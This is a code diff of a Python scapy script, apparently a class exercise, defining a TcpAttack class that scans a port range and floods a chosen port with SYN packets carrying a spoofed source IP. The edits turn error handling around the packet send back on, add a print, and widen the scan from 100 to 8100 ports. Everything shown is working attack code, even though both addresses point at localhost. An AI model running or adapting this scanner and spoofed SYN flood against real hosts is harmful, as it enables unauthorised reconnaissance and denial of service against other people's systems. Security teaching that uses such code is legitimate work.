@@ -22,6 +22,7 @@ class TcpAttack:
                 if test_result == 0:
                     output_file.write(str(port) + '\n')
                 sock.close()
+                print port
 
     def attackTarget(self, port):
         success = 0
@@ -33,19 +34,18 @@ class TcpAttack:
                 IP_header = IP(src=self.spoofIP, dst=self.targetIP)
                 TCP_header = TCP(dport=port, flags="S")
                 packet = IP_header / TCP_header
-                send(packet)
-                # try:
-                #     send(packet)
-                #     success = 1
-                # except Exception as exception:
-                #     print(exception)
+                try:
+                    send(packet)
+                    success = 1
+                except Exception as exception:
+                    print(exception)
         return success
 
 if __name__ == '__main__':
     spoofIP = '127.0.0.1'
     targetIP = '127.0.0.1'
     rangeStart = 1
-    rangeEnd = 100
+    rangeEnd = 8100
     port = 22
     Tcp = TcpAttack(spoofIP, targetIP)
     Tcp.scanTarget(rangeStart, rangeEnd)
